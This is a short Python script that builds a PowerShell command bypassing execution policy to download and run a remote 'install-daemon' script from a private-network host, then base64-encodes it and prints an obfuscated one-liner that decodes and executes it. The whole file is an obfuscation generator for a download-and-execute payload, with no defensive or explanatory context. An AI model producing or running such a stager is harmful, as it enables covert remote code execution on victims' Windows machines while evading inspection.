import base64

cmd = 'powershell -ExecutionPolicy Bypass -Command "iwr -useb http://192.168.1.96:8000/api/install-daemon?os=win | iex"'
b = base64.b64encode(cmd.encode()).decode()
print("Encoded Base64 String:")
print(b)
print("\nFull Obfuscated Command:")
print(f"powershell -c \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b}')) | iex\"")
